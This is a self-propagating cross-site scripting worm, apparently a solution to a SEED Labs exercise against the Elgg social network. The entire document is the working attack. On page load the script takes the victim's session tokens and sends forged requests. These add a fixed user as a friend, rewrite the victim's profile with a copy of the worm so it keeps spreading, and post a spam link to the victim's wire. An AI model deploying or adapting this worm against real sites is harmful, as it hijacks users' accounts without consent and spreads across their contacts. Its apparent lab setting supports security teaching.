<script id="worm" type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	alert(jsCode);
    


	var sendurl_frnd_req="http://www.seed-server.com/action/friends/add?friend=59"+ts+ts+token+token;

    var sendurl_prof_edit="http://www.seed-server.com/action/profile/edit"; //FILL IN
	var acc_desc="&accesslevel[description]=1";
	var desc="&description="+wormCode;
	var brief="&briefdescription=Meh";
	var acc_brief="&accesslevel[briefdescription]=1";
	var location="&location=Gaza";
	var acc_location="&accesslevel[location]=1";
	var interests="&interests=Hacking";
	var acc_interests="&accesslevel[interests]=1";
	var skills="&skills=Nothing";
	var acc_skills="&accesslevel[skills]=1";
	var contactemail="&contactemail=tobey@gmail.com";
	var acc_contactemail="&accesslevel[contactemail]=1";
	var phone="&phone=123456789";
	var acc_phone="&accesslevel[phone]=1";
	var mobile="&mobile=123456789";
	var acc_mobile="&accesslevel[mobile]=1";
	var website="&website=http://ggwp.com";
	var acc_website="&accesslevel[website]=1";
	var twitter="&twitter=Point break";
	var acc_twitter="&accesslevel[twitter]=1";
	var guid="&guid="+elgg.session.user.guid;
	var nname="&name="+elgg.session.user.name;
	var content=token+ts+acc_desc+desc+brief+acc_brief+location+acc_location+interests+acc_interests+skills+acc_skills+contactemail+acc_contactemail+phone+acc_phone+mobile+acc_mobile+website+acc_website+twitter+acc_twitter+guid+nname;

    var sendurl_wire="http://www.seed-server.com/action/thewire/add"; //FILL IN
    var samyurl="http://www.seed-server.com/profile/"+elgg.session.user.username;
	var body="&body= To earn 12 USD/Hour(!),visit now "+samyurl;
	var ccontent=token+ts+body;

    if(elgg.session.user.guid!=59){
    Ajax=new XMLHttpRequest();
	Ajax.open("GET",sendurl_frnd_req,true);
	Ajax.setRequestHeader("Host","www.seed-server.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send();

// var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl_prof_edit,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);



		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl_wire,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(ccontent);

    }

}

</script>


